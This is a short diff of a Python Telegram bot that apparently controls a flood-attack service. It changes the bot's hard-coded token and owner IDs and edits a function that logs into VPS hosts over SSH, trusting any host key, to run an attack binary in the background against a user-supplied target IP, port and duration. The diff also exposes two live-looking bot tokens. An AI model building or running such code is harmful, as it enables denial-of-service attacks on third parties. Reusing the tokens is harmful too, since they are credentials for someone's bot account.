@@ -24,8 +24,8 @@ def log_execution(message_text):
         f.write(f"[{timestamp}] {message_text}\n")
 
 # Configuration
-BOT_TOKEN = '8168943059:AAFtxQeE_O9qbYC4SFleZ6OlCIWqeuPFDEw'
-BOT_OWNER_IDS = [5730843286,7816069263]
+BOT_TOKEN = '8168943059:AAHb2Jj4Xv-5bmLegY8qQ2aNfhlF190p2Vc'
+BOT_OWNER_IDS = [7688337621,7816069263]
 APPROVED_CHAT_IDS = []
 
 # File paths
@@ -775,7 +775,7 @@ def list_files_on_vps(vps, directory="."):
 # ---------------------------
 def execute_command(vps, target_ip, target_port, duration):
     try:
-        command = f'nohup ./go {target_ip} {target_port} {duration} 400 > /dev/null 2>&1 &'
+        command = f'nohup ./aj {target_ip} {target_port} {duration} > /dev/null 2>&1 &'
         client = paramiko.SSHClient()
         client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
         client.connect(vps['ip'], username=vps['username'], password=vps['password'], timeout=10)
